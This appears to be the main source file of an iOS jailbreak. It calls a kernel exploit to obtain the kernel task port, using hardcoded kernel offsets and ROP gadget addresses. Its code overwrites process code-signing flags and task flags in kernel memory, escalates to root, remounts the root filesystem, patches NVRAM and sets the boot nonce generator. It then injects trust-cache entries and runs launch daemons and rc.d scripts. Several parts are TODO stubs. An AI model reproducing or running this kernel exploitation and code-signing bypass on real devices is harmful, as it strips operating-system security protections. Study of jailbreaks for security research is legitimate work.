#include <dlfcn.h>
#include <stdbool.h>
#include <stdint.h>
#include <sys/stat.h>
#include <mach/mach.h>

#include "common.h"
#include "infoleak.h"
#include "pwn.h"
#include "utils.h"
#include "kmem.h"
#include "root.h"
#include "kcall.h"
#include "cs_blobs.h"
#include "kutils.h"
#include "root_fs.h"
#include "nonce.h"
#include "codesign.h"
#include "remote.h"

#include "jailbreak.h"

#define MACH(func)\
    ret = func;\
    if (ret != KERN_SUCCESS)\
    {\
        LOG(#func " (ln.%d) failed: %x (%s)", __LINE__, ret, mach_error_string(ret));\
        goto out;\
    }

#define VAL_CHECK(value)\
    if ((value) == 0x0)\
    {\
        LOG("(ln.%d)failed to find " #value "!", __LINE__);\
        ret = KERN_FAILURE;\
        goto out;\
    }

offsets_t offs = (offsets_t){
    #ifdef __LP64__
    .constant = {
        .kernel_image_base = 0xfffffff007004000,
    },
    .funcs = {
        .copyin = 0xfffffff00719e88c,
        .copyout = 0xfffffff00719eab0,
        .current_task = 0xfffffff0070e8c0c,
        .get_bsdtask_info = 0xfffffff0070fe7ec,
        .vm_map_wire_external = 0xfffffff007148fe8,
        .vfs_context_current = 0xfffffff0071f2310,
        .vnode_lookup = 0xfffffff0071d3f90,
        .osunserializexml = 0xfffffff0074dd7e4,

        .ipc_port_alloc_special = 0xfffffff0070ad1a8,
        .ipc_kobject_set = 0xfffffff0070c3148,
        .ipc_port_make_send = 0xfffffff0070ac924,
    },
    .gadgets = {
        .add_x0_x0_ret = 0xfffffff0063fddbc,
    },
    .data = {
        .realhost = 0xfffffff0075d6b98,
        .zone_map = 0xfffffff0075f3e50,
        .kernel_task = 0xfffffff0075d1048,
        .kern_proc = 0xfffffff0075d10a0,
        .rootvnode = 0xfffffff0075d1088,
        .osboolean_true = 0xfffffff007640468,
        .trust_cache = 0xfffffff0076ab828,
    },
    .vtabs = {
        .iosurface_root_userclient = 0xfffffff006e73590,
    },
    .struct_offsets = {
        .is_task_offset = 0x28,
        .task_itk_self = 0xd8,
        .itk_registered = 0x2f0,
        .ipr_size = 0x8, // ipc_port_request->name->size
        .sizeof_task = 0x5c8,
    },
    .iosurface = {
        .create_outsize = 0xbc8,
        .create_surface = 0,
        .set_value = 9,
    },
    #endif
};

task_t kernel_task;
kptr_t kernel_slide;
kptr_t kernproc;

kern_return_t jailbreak(uint32_t opt)
{
    kern_return_t ret = 0;
    task_t self = mach_task_self();
    kptr_t kbase = 0;
    NSFileManager *fileMgr = [NSFileManager defaultManager];

    if(opt & JBOPT_POST_ONLY)
    {
        ret = host_get_special_port(mach_host_self(), HOST_LOCAL_NODE, 4, &kernel_task);
        ASSERT_RET_PORT(out, "kernel_task", ret, kernel_task);
        task_dyld_info_data_t info;
        mach_msg_type_number_t cnt = TASK_DYLD_INFO_COUNT;
        ASSERT_RET(out, "task_info", task_info(kernel_task, TASK_DYLD_INFO, (task_info_t)&info, &cnt));
        kbase = info.all_image_info_addr;
    }
    else
    {
        suspend_all_threads();

        ret = pwn_kernel(offs, &kernel_task, &kbase);

        resume_all_threads();
            
        if(ret != KERN_SUCCESS) goto out;

        LOG("hold the line--");
        sleep(3);
    }

    kernel_slide = kbase - offs.constant.kernel_image_base;

    if (!MACH_PORT_VALID(kernel_task))
    {
        LOG("invalid kernel task");
        goto out;
    }

    // TODO: do shit with tfp0 here?
    LOG("got kernel_task: %x\n", kernel_task);

    kernproc = rk64(offs.data.kern_proc + kernel_slide);
    VAL_CHECK(kernproc);

    LOG("kernproc: %llx\n", kernproc);

    MACH(elevate_to_root());

    MACH(init_kexecute(offs.data.zone_map, offs.gadgets.add_x0_x0_ret));

    kptr_t kexec_test = kexecute(offs.gadgets.add_x0_x0_ret, 1, 0x20);
    VAL_CHECK(kexec_test);

    uint64_t myproc = find_proc(getpid());
    VAL_CHECK(myproc);

    uint64_t mytask = rk64(myproc + 0x18); // proc->task
    VAL_CHECK(mytask);

    {
        // patch our csflags
        uint32_t csflags = rk32(myproc + 0x2a8); // proc->p_csflags (_cs_restricted, first ldr offset)
        VAL_CHECK(csflags);
        LOG("current csflags: %x", csflags);

        csflags = (csflags | CS_PLATFORM_BINARY | CS_INSTALLER | CS_GET_TASK_ALLOW) & ~(CS_RESTRICT | CS_HARD | CS_KILL);
        wk32(myproc + 0x2a8, csflags);
        LOG("updated csflags: %x", csflags);
    }

    {
        // patch t_flags
        // bypasses task_conversion_eval checks 
        uint32_t t_flags = rk32(mytask + 0x3a0); // task->t_flags
        VAL_CHECK(t_flags);

        LOG("current t_flags: %x", t_flags);
        t_flags |= 0x400; // TF_PLATFORM

        wk32(mytask + 0x3a0, t_flags);
        LOG("new t_flags: %x", t_flags);
    }

    MACH(remount_root_fs());
    LOG("remounted root fs");

    fclose(fopen("/.cydia_no_stash", "w"));

    {
        // patch nvram
        MACH(patch_nvram());
        LOG("patched nvram successfully");

        // set generator 
        // TODO: set this to 0x0
        MACH(set_generator("0x4042a4a24545d094"));
    }
    
    {
        // set dyld task info for kernel
        // note: this offset is pretty much the t_flags offset +0x8
        uint64_t kernel_task_addr = rk64(offs.data.kernel_task + kernel_slide);
        wk64(kernel_task_addr + 0x3a8, kbase);  // task->all_image_info_addr
        wk64(kernel_task_addr + 0x3b0, kernel_slide); // task->all_image_info_size
    
        struct task_dyld_info dyld_info = {0};
        mach_msg_type_number_t count = TASK_DYLD_INFO_COUNT;
        ret = task_info(kernel_task, TASK_DYLD_INFO, (task_info_t)&dyld_info, &count);
        LOG("task_info ret: %x (%s)", ret, mach_error_string(ret));
        
        if (ret == KERN_SUCCESS)
        {
            LOG("all_image_info_addr: %llx", dyld_info.all_image_info_addr);
            LOG("all_image_info_size: %llx", dyld_info.all_image_info_size);
            
            if (dyld_info.all_image_info_addr != kbase)
            {
                LOG("failed to set all_image_info_addr godammit");
            }
            
            if (dyld_info.all_image_info_size != kernel_slide)
            {
                LOG("failed to set all_image_info_size godammit");
            }
        }
    }

    // get bundle path
    CFBundleRef mainBundle = CFBundleGetMainBundle();
    CFURLRef resourcesUrl = CFBundleCopyResourcesDirectoryURL(mainBundle);
    int len = 4096;
    char *bundle_path = malloc(len);
    CFURLGetFileSystemRepresentation(resourcesUrl, TRUE, (UInt8 *)bundle_path, len);
    LOG("bundle path: %s", bundle_path);
    
    #define COPY_RESOURCE(name, to_path)\
    do\
    {\
        unlink(to_path);\
        [fileMgr copyItemAtPath:[NSString stringWithFormat:@"%s/%s", bundle_path, name] toPath:@to_path error:nil];\
        chown(to_path, 0, 0);\
        chmod(to_path, 755);\
    }\
    while (0)

    // MACH(mkdir("/jb"));

    // if (access("/jb", F_OK) != 0)
    // {
    //     LOG("failed to create /jb directory!");
    //     ret = KERN_FAILURE;
    //     goto out;
    // }

    {
        // TODO: bootstrapping
    }

    if (access("/Library/MobileSubstrate/ServerPlugins/Unrestrict.dylib", F_OK) == 0)
    {
        unlink("/Library/MobileSubstrate/ServerPlugins/Unrestrict.dylib");
    }

    COPY_RESOURCE("Unrestrict.dylib", "/Library/MobileSubstrate/ServerPlugins/");
    LOG("unrestrict: %d", access("/Library/MobileSubstrate/ServerPlugins/Unrestrict.dylib", F_OK));

    {
        // TODO: copy/check for libjailbreak
        // chmod("/usr/lib/libjailbreak.dylib", 0755);

        // TODO: copy/check for jailbreakd 

        unlink("/var/tmp/jailbreakd.pid");

        NSData *blob = [NSData dataWithContentsOfFile:@"/bees/offsets.plist"];
        if (blob == NULL)
        {
            LOG("failed to open offsets.plist");
            ret = KERN_FAILURE;
            goto out;
        }

        NSMutableDictionary *dict = [NSPropertyListSerialization propertyListWithData:blob options:NSPropertyListMutableContainers format:nil error:nil];
        
        dict[@"AddRetGadget"]       = [NSString stringWithFormat:@"0x%016llx", offs.gadgets.add_x0_x0_ret + kernel_slide];
        dict[@"KernProc"]           = [NSString stringWithFormat:@"0x%016llx", offs.data.kern_proc + kernel_slide];
        dict[@"OSBooleanTrue"]      = [NSString stringWithFormat:@"0x%016llx", rk64(rk64(offs.data.osboolean_true + kernel_slide))];
        dict[@"OSBooleanFalse"]     = [NSString stringWithFormat:@"0x%016llx", rk64(rk64(offs.data.osboolean_true + 0x8 + kernel_slide))];
        dict[@"OSUnserializeXML"]   = [NSString stringWithFormat:@"0x%016llx", offs.funcs.osunserializexml + kernel_slide];
        dict[@"Smalloc"]            = [NSString stringWithFormat:@"0x%016llx", 0xFFFFFFF006822CB0 + kernel_slide];
        dict[@"ZoneMapOffset"]      = [NSString stringWithFormat:@"0x%016llx", offs.data.zone_map + kernel_slide];
        [dict writeToFile:@"/bees/offsets.plist" atomically:YES];
        LOG("wrote offsets.plist");
        
        chown("/bees/offsets.plist", 0, 0);
        chmod("/bees/offsets.plist", 0644);
    }

    {
        if (access("/usr/libexec/substrate", F_OK) == 0)
        {
            inject_trust("/usr/libexec/substrate");

            ret = execprog("/usr/libexec/substrate", NULL);
            LOG("substrate ret: %d", ret);
        }
    }

    {
        // TODO: copy/check for launchctl
        MACH(inject_trust("/bees/launchctl"));

        // start launchdaemons
        ret = execprog("/bees/launchctl", (const char **)&(const char *[])
                        {
                            "/bees/launchctl",
                            "load",
                            "-w",
                            "/Library/LaunchDaemons",
                            NULL
                        });
        if (ret != 0)
        {
            LOG("failed to start launchdaemons: %d", ret);
        }
        LOG("started launchdaemons: %d", ret);

        // run rc.d scripts
        if (access("/etc/rc.d", F_OK) == 0)
        {
            // "No reason not to use it until it's removed" - sbingner, 12-11-2018
            typedef int (*system_t)(const char *command);
            system_t sys = dlsym(RTLD_DEFAULT, "system");
            
            NSArray *files = [fileMgr contentsOfDirectoryAtPath:@"/etc/rc.d" error:nil];
            
            for (NSString *file in files)
            {
                NSString *fullPath = [NSString stringWithFormat:@"/etc/rc.d/%@", file];

                // ignore substrate
                if ([fullPath isEqualTo:@"/etc/rc.d/substrate"])
                {
                    LOG("ignoring substrate...");
                    continue;
                }

                ret = sys([fullPath UTF8String]);
                
                // poor man's WEIEXITSTATUS
                LOG("ret on %s: %d\n", [fullPath UTF8String], (ret >> 8) & 0xff);
            }
        }
    }

    if(opt & JBOPT_INSTALL_CYDIA)
    {
        // TODO: install Cydia.deb via dpkg 
        
        if(opt & JBOPT_INSTALL_UNTETHER)
        {
            // TODO: Install untether & register it with dpkg
        }
    }
    else if(opt & JBOPT_INSTALL_UNTETHER)
    {
        // TODO: Install untether without any kind of bootstrap
        // ...how is this meant to work? 
    }

    ret = KERN_SUCCESS;
out:;
    restore_to_mobile();

    term_kexecute();

    if(MACH_PORT_VALID(kernel_task))
    {
        mach_port_deallocate(self, kernel_task);
    }
    return ret;
}
